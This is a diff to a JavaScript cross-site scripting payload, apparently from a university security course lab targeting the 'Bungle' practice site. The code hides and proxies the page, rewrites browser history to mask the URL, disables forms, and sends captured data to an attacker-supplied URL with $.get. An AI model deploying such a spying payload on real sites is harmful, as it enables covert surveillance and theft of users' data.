@@ -59,6 +59,8 @@ function payload(attacker) {
     // Note that you can proxy the main page, or a search page!
 	function proxy(href, spying_url) {
 
+        // history.pushState(null, null, `http://bungle-cs461.csl.illinois.edu/`);
+
         // Make all current HTML invisible.
         $('html').hide();
 
@@ -78,7 +80,7 @@ function payload(attacker) {
                 };
                 window.history.replaceState(stateDict, currentTitle, currentPage);
                 $("title")[0].text = currentTitle;
-                console.log("test");
+                console.log("Update Current Page");
                 inject();
                 // injectIntoPage();
                 // logPage();
@@ -98,9 +100,24 @@ function payload(attacker) {
                 $.get(attacker, data);
                 // console.log("test");
             }
+
+            var first = true;
             
             function inject(){
                 console.log("Original Page");
+                
+                if(first){
+                    console.log("Reset URL");
+                    var stateDict = {
+                    "html": $("html").html(),
+                    "title": "NOT Bungle!",
+                    "page": ""
+                    };
+                    window.history.replaceState(stateDict, "NOT Bungle!", target);
+                    first = false;
+                }
+
+
                 $("title", window.parent.document).text("NOT Bungle!");
 
                 $(".form-inline").attr("onsubmit", "return false");
@@ -211,7 +228,7 @@ function payload(attacker) {
                         return false;
                     });
 				});
-
+                
                 
             }
 
